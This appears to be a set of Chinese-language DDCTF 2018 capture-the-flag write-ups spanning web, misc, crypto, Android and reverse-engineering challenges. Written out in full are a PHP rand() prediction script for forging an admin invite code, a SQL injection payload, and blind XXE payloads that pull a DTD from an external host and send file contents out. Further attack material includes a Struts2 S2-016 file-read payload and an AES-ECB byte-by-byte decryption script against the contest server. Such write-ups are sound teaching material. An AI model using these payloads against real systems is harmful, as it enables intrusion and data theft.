那么我们可以再构造一条链，只要比主链长，那这条链就是我们说了算。 此时虽然说区块链1是正规的链，但是区块链2要比1长，此时区块链2即为正规链。 但是，说的轻巧，我们该如何构造呢？ 首先，我们分析路由可以发现，题目预留了一个创建交易的接口。此时可以生成新块。 只要我们可以挖到一个DDcoin，就可以创建一次新块，然后会判断商店的余额。最终给予砖石奖励。 然而DDcoin是什么呢。 在这道题里，其实就是这个东西，这就是一个区块。对他进行分析一下。 nonce:自定义字符串 prev：上一个区块的地址 hash：这个区块的hash height：当前处于第几个节点 transactions：交易信息 再分析transactions input与signature好像是一个凭证，验证这个区块主人身份。 output，收款人信息 amount，收款数额 addr，收款地址 hash这里的话，不是太明白。 但是看代码。发现都有现成的可以生成。只要利用这三个函数，即可创建一个新的区块。 create_output_utxo(addr_to, amount) // 新建一个output信息 create_tx(input_utxo_ids, output_utxo, privkey_from=None) // 新建一个transactions信息 create_block(prev_block_hash, nonce_str, transactions) // 新建一个区块 首先新建output，此时参数很简单，收货人地址（商店），数量（全款） 然后创建tx，此时output_utxo就是刚刚咱创建好的那个。然而问题来了，私钥和id咱是没有的。此时分析代码可以发现，这一步做的主要就是创建一个sig签名。还有就是生成一个hash 此时，邪恶的想到，既然是要创建第二条链，那么可不可以借用一下第一条链的第一块的信息。 也就是直接忽略掉sig的生成，伪造tx，直接重写一下create_tx 然后此时tx也有了，进行下一步create_block 此时他的三个参数也好写，上一个区块的hash，自定义字符串，刚刚做好的tx 此时，我们要通过爆破nonce的方式，来使create_block生成的块的hash为00000开头， 这样，我们才能添加。 然后向那个添加块的地址post由create_block即可成功添加第一个块。 记得改请求头中的content-type为json。还有就是cookie自己手动更新 第二个块的时候，问题又来了。 这条链中，我们之前的tx已经使用过一次，无法使用了。怎么办？ 此时可以注意到题目中init中给的hint。 凭啥他可以不写tx就生成块！不开心，你都能那样，我也要！ 于是。。。。。通过这个方式，在后面添加几个空区块就好。 成功伪造主链！获取一颗砖石。 再次重复以上做法，完成第三条链即可获取到flag 切记，手动更新cookie…… 我的博客 题目 ： 提示：www.tar.gz http://116.85.39.110:5032/a8e794800ac5c088a73b6b9b38b38c8d 解答 ： 题目又给了源码，美滋滋。 然而下载到源码后就不美滋滋了。 一共给了三个页面，主页很明显，有一个SQL注入漏洞。这个题之前安恒杯三月见过。利用率printf函数的一个小漏洞，%1$’可以造成单引号逃逸。 然而，你是进不去主页的。因为。。 还没进去，就被die了。 然后只好分析如何能成为admin了。此时看到了。 当你是通过邀请码注册的，你便可以成为admin。 然而，邀请码是完全随机的。 此时，想起LCTF的一道题，感觉完全一样有木有！ https://github.com/LCTF/LCTF2017/tree/master/src/web/%E8%90%8C%E8%90%8C%E5%93%92%E7%9A%84%E6%8A%A5%E5%90%8D%E7%B3%BB%E7%BB%9F 然而当时有两个解，一个非预期条件竞争，另一个正则的漏洞。 此时这题完全没用啊！当时要疯了，猜测，难道是要预测随机数？ 然而，当我看到大佬这句话的时候，萌生了放弃的想法，猜测肯定还有其他解法。 奈何，看啊看，看啊看，我瞪电脑，电脑瞪我。 最后还是决定看一下随机数这里。很开心，找到了这篇文章。 http://drops.xmd5.com/static/drops/web-11861.html 然而，每个卵用，他只告诉了我：对！毛病就在随机数，但是你会么？ 满满的都是嘲讽…. 来吧，一起看，首先这篇文章讲了一种后门的隐藏方式，话说我读了好几遍才理解。 然后不得不感叹，作者….你还是人么。这都能想出来。服！真的服！ 首先，大家需要先知道rand()是不安全的随机数。（然而我不知道） 然后str_shuffle()是调用rand()实现的随机。所以此时重点是。如何预测rand？ 然而作者没告诉，给的链接都是数学，看不懂….. 此时PHITHON大佬的这篇文章真的是解救了自己。 https://www.leavesongs.com/penetration/safeboxs-secret.html 所以，此时我们知道了一件事情。当我们可以获取到连续的33个随机数后，我们就可以预测后面连续的所有随机数。 如何连续？大佬文章中说了，通过http请求头中的Connection:Keep-Alive。 此时，我们先获取他100个随机数。 s = requests.Session() url='http://116.85.39.110:5032/a8e794800ac5c088a73b6b9b38b38c8d/register.php' headers={'Connection': 'Keep-Alive'} state=[] for i in range(50): r=s.get(url,headers=headers) state.append(int(re.search(r'id=\"csrf\" value=\"(.+?)\" required>', r.text, re.M|re.I).group(1))) 然后测试一下 yuce_list=[] for i in range(10): yuceTemp=yuce(len(state)) state.append(yuceTemp) yuce_list.append(yuceTemp) 此时发现和实际是有一些冲突的。分析后发现，应该将生成的随机数取余2147483647才是真正的数。 但此时又有了一个问题。 之前大佬是说过会有一定的误差，但是误差率太高了。虽然误差不大，但是…. 此时，没办法，只能祈求后面会处理误差。此时我们完成了随机数的预测。 接下来需要写如何打乱字符串。 可以发现，一个很简单的流程，生成随机数，然后交换位置。 唯一不知道的地方就是其中这个地方的一个函数。 此时直接去GitHub翻一下源码。 https://github.com/jinjiajin/php-5.6.9/blob/35e92f1f88b176d64f1d8fc983e466df383ee34e/ext/standard/php_rand.h 然后就是愉快的重写代码。 def rand_range(rand,minN,maxN,tmax=2147483647): temp1=tmax+1.0 temp2=rand/temp1 temp3=maxN-minN temp4=temp3+1.0 temp5=temp4*temp2 rand=minN+(int)(temp5) return rand admin_old=['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'] for i in range(len(admin_old))[::-1]: a=rand_range(int(yuce_list[len(admin_old)-i-1]),0,i) admin_old[i],admin_old[a]=admin_old[a],admin_old[i] key='' for i in admin_old: key+=i print(key) 此时就可以愉快的生成随机数了。然后在进行一下注册。此时csrf记得提前在获取state时保存一下最后一位。 def getAdmin(username,passwd,code): data={ \"csrf\":csrf, \"username\":username, \"password\":passwd, \"code\":code } r=s.post(url,headers=headers,data=data) print(r.text) 切记！code是：admin###开头，后面截取32位！ 最后用拿到的账号进行登录即可。 后面就是sql注入了。很简单，只要单引号逃逸后，就可以显注了。没有其他过滤 /a8e794800ac5c088a73b6b9b38b38c8d/index.php?id=1&title=-1%1$'+union+select+1,f14g,3+from+a8e79480.key+where+1+%23 喝杯Java冷静下 题目： 题目环境：Quick4j 解答： 查看网页源代码，找到登录的用户名和密码（admin: admin_password_2333_caicaikan） Line 87: 登录进去发现跟 Web2 差不多，也是 任意文件下载漏洞。 对比 Github 上 Quick4j 的源代码文件路径，把所有代码文件对应的下载下来，与原来的代码进行比较。 找到关键文件，进行反编译： /rest/user/getInfomation?filename=WEB-INF/classes/com/eliteams/quick4j/web/security/SecurityRealm.class if ((username.equals(\"superadmin_hahaha_2333\")) && (password.hashCode() == 0)) { String wonderful = \"you are wonderful,boy~\"; System.err.println(wonderful); } 找到超级管理员用户名和密码（superadmin_hahaha_2333: f5a5a608） /rest/user/getInfomation?filename=WEB-INF/classes/com/eliteams/quick4j/web/controller/UserController.class @RequestMapping(value={\"/nicaicaikan_url_23333_secret\"}, produces={\"text/html;charset=UTF-8\"}) @ResponseBody @RequiresRoles({\"super_admin\"}) 这里以超级管理员身份，可以实现 XML 外部实体注入 漏洞。 但是这里的注入没有回显，那只能用反弹实现回显了。 服务器部署 1.xml： \"> 服务器监听端口：nc -l -p 23946 Payload 示例： %dtd; %all; ]> &send; 读取 /Flag/hint.txt 文件： /rest/user/nicaicaikan_url_23333_secret?xmlData=%3c%3fxml+version%3d%221.0%22+encoding%3d%22utf-8%22%3f%3e%3c!DOCTYPE+data+%5b%3c!ENTITY+%25+file+SYSTEM+%22file%3a%2f%2f%2fflag%2fhint.txt%22%3e%3c!ENTITY+%25+dtd+SYSTEM+%22http%3a%2f%2f222.125.86.10%2f1.xml%22%3e%25dtd%3b+%25all%3b%5d%3e%3cvalue%3e%26send%3b%3c%2fvalue%3e Flag in intranet tomcat_2 server 8080 port. 访问 http://tomcat_2:8080/ ： /rest/user/nicaicaikan_url_23333_secret?xmlData=%3c%3fxml+version%3d%221.0%22+encoding%3d%22utf-8%22%3f%3e%3c!DOCTYPE+data+%5b%3c!ENTITY+%25+file+SYSTEM+%22http%3a%2f%2ftomcat_2%3a8080%2f%22%3e%3c!ENTITY+%25+dtd+SYSTEM+%22http%3a%2f%2f222.125.86.10%2f1.xml%22%3e%25dtd%3b+%25all%3b%5d%3e%3cvalue%3e%26send%3b%3c%2fvalue%3e try to visit hello.action. 访问 http://tomcat_2:8080/hello.action ： /rest/user/nicaicaikan_url_23333_secret?xmlData=%3c%3fxml+version%3d%221.0%22+encoding%3d%22utf-8%22%3f%3e%3c!DOCTYPE+data+%5b%3c!ENTITY+%25+file+SYSTEM+%22http%3a%2f%2ftomcat_2%3a8080%2fhello.action%22%3e%3c!ENTITY+%25+dtd+SYSTEM+%22http%3a%2f%2f222.125.86.10%2f1.xml%22%3e%25dtd%3b+%25all%3b%5d%3e%3cvalue%3e%26send%3b%3c%2fvalue%3e This is Struts2 Demo APP, try to read /flag/flag.txt. 根据题目提示：第二层关卡应用版本号为 2.3.1 上网查了一下 Struts2 2.3.1 的 CVE ，发现 Struts2 S2-016 可用 直接贴上最终 Payload： /rest/user/nicaicaikan_url_23333_secret?xmlData=%3c%3fxml+version%3d%221.0%22+encoding%3d%22utf-8%22%3f%3e%3c!DOCTYPE+data+%5b%3c!ENTITY+%25+file+SYSTEM+%22http%3a%2f%2ftomcat_2%3a8080%2fhello.action%3fredirect%253a%2524%257b%2523a%253dnew%2bjava.io.FileInputStream(%2527%252fflag%252fflag.txt%2527)%252c%2523b%253dnew%2bjava.io.InputStreamReader(%2523a)%252c%2523c%253dnew%2bjava.io.BufferedReader(%2523b)%252c%2523d%253dnew%2bchar%255b60%255d%252c%2523c.read(%2523d)%252c%2523matt%253d%2523context.get(%2527com.opensymphony.xwork2.dispatcher.HttpServletResponse%2527).getWriter()%252c%2523matt.println(%2523d)%252c%2523matt.flush()%252c%2523matt.close()%257d%22%3e%3c!ENTITY+%25+dtd+SYSTEM+%22http%3a%2f%2f222.125.86.10%2f1.xml%22%3e%25dtd%3b+%25all%3b%5d%3e%3cvalue%3e%26send%3b%3c%2fvalue%3e Flag: DDCTF{You_Got_it_WonDe2fUl_Man_ha2333_CQjXiolS2jqUbYIbtrOb} MISC 作者：5am3、impakho 签到题 题目 ： 请点击按钮下载附件 解答 ： 出题人是真的皮。下载后会发现一个神奇的东西。flag.txt里面的内容是这个 请查看赛题上方“公告”页 然后打开公告页，发现了他。。 DDCTF{echo”W3Lc0me_2_DiD1${PAAMAYIM_NEKUDOTAYIM}C7f!”} 好歹咱也是个web手。so ….. 本来还以为要解开里面的PHP代码。自己误以为是这个。 DDCTF{W3Lc0me_2_DiD1::C7f!\"} 最后发现，原来是真·签到题。 (╯°□°）╯︵ ┻━┻ 题目 ： (╯°□°）╯︵ ┻━┻ d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd 解答 ： 这道题蛮坑的。。想了无数种密码后都没思路。最后只能老老实实研究，或许是一些简单的编码？ 一共134个字符。尝试2位一组，转化为十进制后，发现数值在一定范围内浮动。 然后考虑到ascii码可见区域，于是尝试对其进行取余128的操作。 最后发现余数均在ascii码的可见区域。之后hex2ascii 即可获取到flag。 a=[212,232,225,244,160,247,225,243,160,230,225,243,244,161,160,212,232,229,160,230,236,225,231,160,233,243,186,160,196,196,195,212,198,251,185,178,178,225,226,185,185,183,180,225,180,183,227,228,179,178,178,227,230,180,179,226,181,176,182,177,176,230,225,229,225,181,253] b='' for i in a: b+=chr(i%128) print(b) DDCTF{922ab9974a47cd322cf43b50610faea5} 第四扩展FS D公司正在调查一起内部数据泄露事件，锁定嫌疑人小明，取证人员从小明手机中获取了一张图片引起了怀疑。这是一道送分题，提示已经在题目里，日常违规审计中频次有时候非常重要。 拿到图片，发现大小出奇的大，于是尝试binwalk，提出来一个压缩包。 尝试打开，发现是有密码的。（这里有个技巧，个人比较喜欢用windows的好压解压缩软件，这个软件存在一定的压缩包修复。） 然后回到题目，仔细分析。尝试无果后，最终将密码锁定在了提示已经在题目里，所以尝试查看文件属性，发现了一些奇怪的字符串。 一般来说，图片信息中不会出现备注的。所以尝试将其作为密码解压，解压成功。 然后发现了一串稀奇古怪的。。。。字符。 此时想到了题目中给的hint：日常违规审计中频次有时候非常重要 尝试词频统计。得到flag 此时有一点小小坑。。D是两个。。 flag ：DDCTF{x1n9shaNgbIci} 流量分析 题目 ： 提示一：若感觉在中间某个容易出错的步骤，若有需要检验是否正确时，可以比较MD5: 90c490781f9c320cd1ba671fcb112d1c 提示二：注意补齐私钥格式 —–BEGIN RSA PRIVATE KEY—– XXXXXXX —–END RSA PRIVATE KEY—– 解答 ： 怎么说呢，做完这题，我才知道坑人能有多坑！ 流量分析的题，首先可以发现他的大小很小。不像是那种大流量的分析。 尝试了一下学长之前推荐的一款工具《科来网络分析系统》 可以发现ftp传输了两个包。此时，fl-g极有可能是flag。 于是拿wireshark千辛万苦，提取出来压缩包。然而….没有密码。 只好继续分析了。因为毕竟misc4了，不可能是密码爆破啥的吧。 继续看， 发现一个邮件（不知道科来怎么提文件，查看数据。哭唧唧） wireshark导出IMF对象。可以发现导出了几个邮件。然后逐个分析。 然而并没卵用，唯一有点用的，感觉奇怪的，就只有一个邮件。 此时这个不是一点的奇怪！而是很奇怪！那么，这串密钥。。是干什么的呢。 经过老司机多年开车经验，呸。做题经验。 猜测！肯定有https流量。当然，科来也说有了。 于是。。这种之前曾听说过的题目，现在到了手里还是有些小激动的。 尤其是那个图片！图片！图片！！！！ ocr也不行，手写也不行。那么多字。心塞ing。 好吧，最后还是百度找了个ocr识别了一下，然后改了几个字符。。 然后就是解密https流量。具体可以看这个链接。 https://blog.csdn.net/kelsel/article/details/52758192 直接导入私钥就可以。这里需要按照hint格式来，在前后加上标志位。 然后就可以解密https流量了。 然后搜索ssl，追踪http流量，最后取得flag 安全通信 感谢impakho师傅！ 题目： #!/usr/bin/env python import sys import json from Crypto.Cipher import AES from Crypto import Random def get_padding(rawstr): remainder = len(rawstr) % 16 if remainder != 0: return '\\x00' * (16 - remainder) return '' def aes_encrypt(key, plaintext): plaintext += get_padding(plaintext) aes = AES.new(key, AES.MODE_ECB) cipher_text = aes.encrypt(plaintext).encode('hex') return cipher_text def generate_hello(key, name, flag): message = \"Connection for mission: {}, your mission's flag is: {}\".format(name, flag) return aes_encrypt(key, message) def get_input(): return raw_input() def print_output(message): print(message) sys.stdout.flush() def handle(): print_output(\"Please enter mission key:\") mission_key = get_input().rstrip() print_output(\"Please enter your Agent ID to secure communications:\") agentid = get_input().rstrip() rnd = Random.new() session_key = rnd.read(16) flag = '' print_output(generate_hello(session_key, agentid, flag)) while True: print_output(\"Please send some messages to be encrypted, 'quit' to exit:\") msg = get_input().rstrip() if msg == 'quit': print_output(\"Bye!\") break enc = aes_encrypt(session_key, msg) print_output(enc) if __name__ == \"__main__\": handle() 解答 ： 从 get_padding 和 aes_encrypt 能够看出这是一个 AES ECB 256位分组加密加密密钥是 16字节 随机生成，ECB明文分组相同，对应的密文分组也相同。 由此可以通过改变 agentid 的长度，使flag中的字符依次落入前面已知的明文分组中，逐字节爆破。 贴出脚本： from pwn import * import string LOG = False flag = '' mission_key = '********************************' agent_id = '' while True: r = remote('116.85.48.103', 5002) r.recvuntil('mission key:') r.sendline(mission_key) r.recvuntil('communications:') agent_id = 'a' * (13+16*8-len(flag)) r.sendline(agent_id) r.recvline() enc = r.recvline().rstrip()[32*11:32*12] if LOG: print 'enc=%s' % enc for i in string.printable[:-5]: r.recvuntil('to exit:') message = 'Connection for mission: %s, your mission\\'s flag is: %s' % (agent_id, flag + i) r.sendline(message[-16:]) r.recvline() enc_tmp = r.recvline().rstrip() if LOG: print 'enc_tmp=%s' % enc_tmp if enc_tmp == enc: flag += i break r.close() if flag[-1:] == '}': break print 'flag=%s' % flag print 'Flag: %s' % flag Flag: DDCTF{87fa2cd38a4259c29ab1af39995be81a} Android 感谢LeadroyaLshi师傅！ LeveL1 Java 层什么都没有，直接看 native；native 里包含了一些数学计算。 有 init_array ，但里面主要是一些线程相关操作的初始化，没有JNI_OnLoad。 int __fastcall Java_com_didictf_guesskey2018one_MainActivity_stringFromJNI(JNIEnv *a1, jobject a2, jstring a3) { i = 0; bInput = (*a1)->GetStringUTFChars(a1, a3, 0); j_j_GetTicks(); do v10 = j_j_gpower(i++); while ( i != 32 ); j_j_GetTicks(); fromBytes((String *)&p_string, bInput); v5 = (String *)fromString((String *)&cp_string, (String *)&p_string); ret = j_j_j__Z20__aeabi_wind_cpp_prjSs((int)v5); finiString((int *)(cp_string - 12)); finiString((int *)(p_string - 12)); return ret; } 上来先算了32次平方，不知道想干嘛，调用2次GetTicks，不知道想干嘛。之后把输入转为std::string类型，进入check` 函数。 首先检测长度是否为36，以及与 const-data 进行 xor。 while ( 1 ) { if ( v13 >= 1 && currentOff 这个地方校验第0~10、第11~20、第21~30、第30~40是否一模一样。 最后的检测是 if ( v24 ) goto LABEL_40; // if a%b == 0 v26 = j_j_j___aeabi_uldivmod(divisor, dividend); v3 = 1; v25 = (unsigned int)dividend >= (unsigned int)v26; LODWORD(v26) = 1; if ( v25 ) LODWORD(v26) = 0; v27 = 1; if ( HIDWORD(dividend) >= HIDWORD(v26) ) v27 = 0; if ( HIDWORD(dividend) != HIDWORD(v26) ) LODWORD(v26) = v27; if ( !(_DWORD)v26 ) LABEL_40: v3 = 0; finiString((int *)v30 - 3); 这里v3最后被返回了，要求是前者能够整除后者，而且会有除数和商的大小比较，只有除数大于上时候才有可能返回1。 dividend = j_j_atoll((const char *)a1->ptr); 往上翻，发现输入仅与除数有关。 被除数是由两个字符串算出来的，怎么算出来的我也看不大懂，好像是重新组合成一个字符串，拼接字符什么样的，应该可以直接 dump。 【后来看某位老哥写的 writeup，发现是通过2个字符串取 index 得到的】 https://blog.csdn.net/dydxdz/article/details/80037937 map1 = {} str1 = 'deknmgqipbjthfasolrc' for i in range(len(str1)): map1[str1[i]] = i/2 str2 = 'jlocpnmbmbhikcjgrla' k = [] for i in range(len(str2)): print map1[str2[i]], 先创建 map ，第 i 个 char对应的数字是i/2 ，刚好得到每个 char 对应 [0,10) 的数字；再查询 str2里每个 char 所对应的下标，将这个下标加上 '0' ，拼起来，得到新的十进制的字符串。 综上，拿到数字 5889412424631952987 ，将它分解了， 5889412424631952987=1499419583*3927794789 ，输入就是偏大的数字， 1499419583 ，再 xor 一下常量就行了。 最后 flag 是 d5axivcw6ggfswpxg80estgc58h7yghqogbm 。 LeveL2 看起来使用的是 Robust 的热更新框架，没有做太特殊的处理，在 assets 里存放了 GeekTan.BMP ，其实是个 zip 包，里面放着 Robust 的 patch 文件。 有简单的方法，也有复杂的方法，复杂的就是肉眼去看，把代码运行一遍即可，是个约瑟夫问题，也可以直接求解，跟我以前出的用栈写约瑟夫很像。 简单的方法嘛，直接上 xposed input text DDCTF{2517299225169920} XposedHelpers.findAndHookMethod(\"cn.chaitin.geektan.crackme.MainActivity\", loader, \"Joseph\", int.class, int.class, new XC_MethodHook() { @Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable { super.beforeHookedMethod(param); new Exception().printStackTrace(); Log.d(TAG, \"======== before hook =======\"); Log.d(TAG, \"with \" + (int) param.args[0] + \" and\" + (int) param.args[1]); } @Override protected void afterHookedMethod(MethodHookParam param) throws Throwable { super.afterHookedMethod(param); Log.d(TAG, \"======== after hook =======\"); Log.d(TAG, \"result is \" + param.getResult()); } }); LeveL3 Java 层什么都没有，直接看 native。 init_array应该是初始化一些东西，没有过多操作。 没有JNI_OnLoad。 直接看 JNI的方法，进入之后先将输入转化为 std::string ，再使用 str2ll转为int64。 长得比较丑，看起来是做divmod(int64, int64)，循环终止的条件是i==int64(input)，最后检测余数是否和预期相等。 debug 一下，大概就是左移1bit，mod 一下，左移1bit，mod 一下这样，写段 python 爆破即可。 DDCTF{ddctf-android2-KEY} p = 0x17A904F1B91290 mod = 0xDBDEE7AE5A90 In [23]: i = 1 ...: remain = 1 ...: while True: ...: remain = ((remain > 32), hex(remain & 0xFFFFFFFF) ...: break ...: i += 1 ...: 595887 241750416186000 0xdbdeL 0xe7ae5a90L 不知道这题想干嘛。。。 LeveL4 这次只有 java 层，没有 native 层，看起来使用了公开的第三方库 spongycastle，所以丢到网站上 deguard 一下，得到一个非常优美的结果~ 官方说是10位以内的数字，所以是暗示爆破，而且 ECC 么，除了爆破也没有办法。 public MainActivity() { super(); this.editText = \"00C3632B69D3FC1DD8D80C288C44281B67F4828DC77E37EE338E830E66DC71972A008835BA3156353815DFEDEB4330B48B454F35A88D83DA6260C206E4A619753F97\"; } public void onClickTest(View arg24) { this.outputView.setText(\"Empty Input\"); TextView v1 = this.preview; this = this; String v4 = v1.getText().toString(); String v5 = v4; if(v4.length() == 0) { v5 = \"1\"; } new R$id().init(); ECPoint v11 = SECNamedCurves.getByName(\"secp256k1\").getG().multiply(new BigInteger(v5.getBytes())); BigInteger v8 = v11.getXCoord().toBigInteger(); BigInteger v13 = v11.getYCoord().toBigInteger(); byte[] v14 = v8.toByteArray(); byte[] v15 = v13.toByteArray(); byte[] v9 = new byte[v14.length + v15.length]; int v6; for(v6 = 0; v6 使用的是 ECC 加密算法，使用secp256k1曲线，先拿到 G 点，与输入进行椭圆域上的相乘，得到新的点，去校验计算出来的点是否是预先规定好的那个点，是的话就 return true 。 这个没什么操作，就是按照描述去爆破，一开始懒得写 java 代码，直接在手机上爆破的（原谅我脑残），发现速度简直慢到炸，手机烫了一晚上也没跑多少数据。 然后想着优化，但发现这个 API 似乎很不好用， G+G+G 和 G*3 不相等，以及各种神奇的表现，可能是我不大会用API吧，按理说加法比乘法好做很多，每次加一比每次乘法应该要快，但优化时候老是算出来的不一样，就懒得优化了。 最后在 PC上写个爆破脚本，早上起来就看到了 flag，DDCTF{54135710}。 LeveL5 这题就是反调试的大集合，乱七八糟的方式什么都有，Java 层没有东西，直接看 native。 init_array 没有特殊操作，是 C++的初始化。 JNI_OnLoad里动态注册了 JNI 函数，没有额外操作。 直接看了哈，最原始的长这样 int __fastcall Java_check(const char *b_input) { void *v2; // r0@1 void *v3; // r5@1 int i; // r2@4 char v6[32]; // [sp+4h] [bp+0h]@1 memset(v6, 0, 0x20u); v2 = dlopen(\"libc.so\", 0); v3 = v2; if ( v2 ) { open = (int (__fastcall *)(_DWORD, _DWORD, _DWORD))dlsym(v2, \"open\"); close = (int (__fastcall *)(int))dlsym(v3, \"close\"); read = (int (__fastcall *)(_DWORD, _DWORD, _DWORD))dlsym(v3, \"read\"); strncmp = (int (__fastcall *)(_DWORD, _DWORD, _DWORD))dlsym(v3, \"strncmp\"); strstr = (int)dlsym(v3, \"strstr\"); } isTraced = 0; setValue(dword_EF2B5024); maybe_antidebug_1(); some_encrypt_2(dword_EF2B5024, v6); if ( strlen(b_input) == 32 ) { i = 0; do { v6[i] ^= b_input[i]; ++i; } while ( i != 32 ); memcpy(&unk_11100, &v7, 0x20u); // return strncmp(xx, xx, 32); // patch by LeadroyaL } return -1; } 将输入操作一下，xor 一下，返回的是 strncmp 的结果，这不是送分题么？直接上去调试，断下来，发现答案并不对。。。有几个反调试的函数，把 xor_key 给修改了。 sub_3c54是第一个函数，先做一些不知道什么的操作，再检测 tracerPid那行的 strlen ，可以绕过，然后去从sha256_table里取一些值，不知道想干嘛。内层还有一堆不知道在干嘛的函数，估计藏了一些反调试，而且会对 global 的值进行一些操作，乱七八糟的。 反正每次都会被测到反调试，于是懒得搞了，我认输，ok？ patch 一下binary文件，因为是简单的 xor，所以只要能拿到xor_key 即可，在最后一句他是strncmp，如果把它 patch为memcpy的话，在正常运行过程中，就可以将算出来的密文保存下来。之后想办法dump内存，就能拿到密文，与输入进行xor，就拿到了 key。 经过一番努力，终于patch成功了。。。如上图的最后一个 memcpy。 先运行，让它算一遍，再attach，断在最开始，就能拿到明密文对了。 最后算出来是DDCTF{GoodJob,Congratulations!!}。 逆向 感谢奈沙夜影师傅！ Baby MIPS IDA打开发现几个字符串结构都很清晰，提供16个变量，然后进行16次方程校验，但是运行会发现在中间就因为段错误而异常，尝试许久以后发现几个不太对劲的指令，突兀出现的t, sp, 跳转等等的机器码都为EB02开头，猜测为花指令，于是使用IDC脚本去花。 注意MIPS为定长指令集，每个指令都为4字节，因此需要固定监测指令的头部，否则可能会误清除掉正常指令，例如方程参数的赋值 (╯‵□′)╯︵┻━┻ #include static matchBytes(StartAddr, Match) { auto Len, i, PatSub, SrcSub; Len = strlen(Match); while (i 去花后再次分析即可得到清晰的赋值和check过程 有三种求解方法: 方法一：简单粗暴反汇编 写了一个伪执行汇编的py脚本来得到参数，最后清洗一下即可得到方程，通过z3限制BitVec即可跑出整数解 f = open(\"code.txt\", \"r\") flower = [\"slti\", \"sdc1\"] a0 = 0x76ff270 v0 = 0xd0000 v1 = 8 fp = [0 for i in range(0x500)] table = [0x0, 0x42d1f0, 0x0, 0x42d1f0, 0xa, 0xa, 0x0, 0x9, 0x4250bc, 0x9, 0x426630, 0x42d1f0, 0x40a3ec, 0x37343431, 0x363434, 0x0, 0x0, 0x42d1f0, 0x0, 0x4250bc, 0x0, 0x0, 0x425060, 0x42d1f0, 0x403ad0, 0x0, 0x0, 0x1000, 0x425088, 0x76fff184, 0x412fcd, 0x1, 0x410570, 0x425190, 0x40ca48, 0x0, 0x0, 0x42d1f0, 0x0, 0x42d1f0, 0x425088, 0xffffffff, 0x4106c4, 0xffffffff, 0x76fff184, 0x412fcd, 0x1, 0x42d1f0, 0x0, 0x425088, 0x40ccac, 0x0, 0x0, 0x0, 0x0, 0x42d1f0, 0x0, 0x425190, 0x76ffeef8, 0x425190, 0x10, 0x425088, 0x40baac, 0x42d1f0, 0x412fcd, 0x1, 0x425088, 0x40baac, 0x76fff184, 0x412fce, 0x40b684, 0x0, 0x0, 0x0, 0x0, 0x42d1f0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x42d1f0, 0x0, 0x42d1f0, 0x0, 0x4250bc, 0x413081, 0x9, 0x403f24, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x42d1f0, 0x0, 0x413078, 0x0, 0x0, 0x0, 0x0, 0xd0000, 0xf1f4, 0xcf8, 0xf5f1, 0x7883, 0xe2c6, 0x67, 0xeccc, 0xc630, 0xba2e, 0x6e41, 0x641d, 0x716d, 0x4505, 0x76fff224, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xfffffffe, 0x0, 0x76fff2ac, 0x412fcd, 0x1, 0x0, 0x6, 0x7fffffff, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa, 0xa, 0x425088, 0x8, 0x7ffffff8, 0x100, 0x413f38, 0x1, 0x413f38, 0x0, 0x2, 0x76fff0f8, 0x0, 0x0, 0x7fffffff, 0x76fff220, 0x405050, 0x550001, 0x0, 0x425000, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x76fff220, 0x404d84, 0x42d1f0, 0x0, 0x500, 0x5, 0x42d1f0, 0xb3b, 0x76fff224, 0x115, 0x1a131100, 0x76fff220, 0x76fff270, 0x76fff2ac, 0xffbecf88, 0xa, 0x405880] j = 0 functions = 0 for i in range(0xb4, 0x410, 4): fp[i] = table[j] j += 1 input = [int(str(i)*3, 16) for i in range(16)] try: while(True): code = f.readline() if(code == \"\"): print(\"finish\") break if(code[:3] == \"loc\"): # print(\"n[s]:t\" + code[:-1]) continue if(code.find(\"nop\")!=-1): continue code = code.split(\"$\") # print(code) c = code[0].strip() if(c==\"sw\"): n1 = code[1].split(\",\")[0] n2 = 0x410 - int(\"0x\" + code[1].split(\"_\")[1].split(\"(\")[0], 16) code = (\"fp[\" + hex(n2) + \"] = \" + n1) elif(c==\"li\"): n1 = code[1].split(\",\")[0] n2 = code[1].split(\",\")[1].strip() code = (n1 + \" = \" + n2) elif(c==\"lw\"): n1 = code[1].split(\",\")[0] if(\"\".join(code).find(\"fp\")!=-1): n2 = 0x410 - int(\"0x\" + code[1].split(\"_\")[1].split(\"(\")[0], 16) code = (n1 + \" = fp[\" + hex(n2) + \"]\") # print(\"# \" + hex(fp[n2])) #输出方程 print(\"0x%x*\"%fp[n2],end='') else: # print(\"[c]:t\" + \"\".join(code)[:-1], \"v0=%x\"%v0) n2 = ((v0) + int(code[1].split(\",\")[1].replace(\"(\", \"\")))//4 code = (n1 + \" = input[\" + str(n2) + \"]\") print(\"a[%d]\"%n2) # print(code) # print(hex(v0)) # break elif(c==\"sll\"): n1 = code[1].split(\",\")[0] n2 = code[1].split(\",\")[1].strip() code = (n1 + \" = \" + n1 + \">\" + n2) elif(c==\"xori\"): n1 = code[1].split(\",\")[0] n2 = code[1].split(\",\")[1].strip() code = (n1 + \" = \" + n1 + \"^\" + n2) elif(c==\"addiu\"): n1 = code[1].split(\",\")[0] n2 = code[1].split(\",\")[1].strip() code = (n1 + \" = \" + n1 + \"+\" + n2) # print(\"+\") elif(c==\"mul\"): n1 = code[1].split(\",\")[0] n2 = code[2].split(\",\")[0].strip() n3 = code[3].strip() code = (n1 + \" = \" + n2 + \"*\" + n3) elif(c==\"addu\"): n1 = code[1].split(\",\")[0] n2 = code[2].split(\",\")[0].strip() code = (n1 + \" = \" + n1 + \"+\" + n2) 